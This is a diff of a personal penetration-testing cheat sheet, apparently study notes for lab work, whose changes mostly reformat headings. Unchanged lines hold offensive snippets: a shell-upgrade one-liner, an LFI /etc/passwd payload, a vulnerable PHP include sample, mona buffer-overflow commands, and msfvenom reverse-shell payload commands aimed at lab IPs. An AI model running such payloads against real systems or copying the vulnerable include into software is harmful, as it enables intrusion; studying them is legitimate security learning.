@@ -1,6 +1,6 @@
 # I'm the BEST to ever DO IT
- ### GENERAL
- ##### Lemmie upgrade you
+ # GENERAL
+##### Lemmie upgrade you
  ```bash
 Upgrade $ /bin/sh to full /bin/bash shell
 python -c "import pty;pty.spawn('/bin/bash')"
@@ -31,17 +31,17 @@ sudo NetworkManager restart
 ```bash
 smbclient //MOUNT/Yourmomma -I 192.168.154.55 -N
 ```
-### SQLi 
+# SQLi 
 ```bash
 
 ```
 
-### SQL General 
+# SQL General 
 ```bash
 
 ```
 
-### LIF/RFI 
+# LIF/RFI 
 ```bash
 =/etc/passwd
 LFI with Path Traversal
@@ -220,17 +220,17 @@ $incfile = $_REQUEST["file"];
 include($incfile.".php");  
 ```
 
-###  POWERSHELL
+#  POWERSHELL
 ```bash
 
 ```
 
-### MSFVENOM 
+# MSFVENOM 
 ```bash
 
 ```
 
-### BUFFER OVERFLOW 
+# BUFFER OVERFLOW 
 ```bash
 !mona config -set workingfolder c:\mona\bruiser
 !mona findmsp -distance 600
@@ -244,17 +244,17 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread 
 msfvenom -p windows/shell_reverse_tcp LHOST=10.6.41.12 LPORT=4444 EXITFUNC=thread -b "\x00" -f py
 ```
 
-### LINUX PRIVESC
+# LINUX PRIVESC
 ```bash
 
 ```
 
-### WINDOWS PRIVESC 
+# WINDOWS PRIVESC 
 ```bash
 
 ```
 
-### Compile 
+# Compile 
 ```bash
 UBUNTU
 sudo nano /etc/apt/sources.list
